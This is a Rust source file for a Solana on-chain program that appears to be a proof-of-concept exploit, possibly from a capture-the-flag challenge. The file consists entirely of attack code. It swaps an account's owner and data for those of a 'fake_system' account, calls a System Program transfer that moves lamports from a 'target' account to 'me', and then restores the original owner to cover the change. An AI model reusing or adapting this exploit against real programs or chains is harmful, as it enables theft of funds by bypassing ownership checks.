use solana_program::{
    account_info::AccountInfo,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    msg,
    program::invoke,
    pubkey::Pubkey,
    system_instruction::SystemInstruction,
    system_program,
};

solana_program::entrypoint!(process_instruction);
fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let fake_system = &accounts[1];
    let target = &accounts[2];
    let me = &accounts[3];

    let mut tmp_native_owner = [0u8; 32];
    tmp_native_owner.copy_from_slice(accounts[0].owner.as_ref());

    accounts[0].assign(fake_system.owner);

    let system = &accounts[0];
    let mut new_system = system.clone();
    new_system.data = fake_system.data.clone();

    let account_metas = vec![
        AccountMeta::new(*target.key, false),
        AccountMeta::new(*me.key, false),
    ];
    let ix = Instruction::new_with_bincode(
        system_program::id(),
        &SystemInstruction::Transfer { lamports: 1 },
        account_metas,
    );

    msg!("swapped owner and data");
    invoke(&ix, &[target.clone(), me.clone(), new_system])?;

    accounts[0].assign(&Pubkey::from(tmp_native_owner));

    Ok(())
}
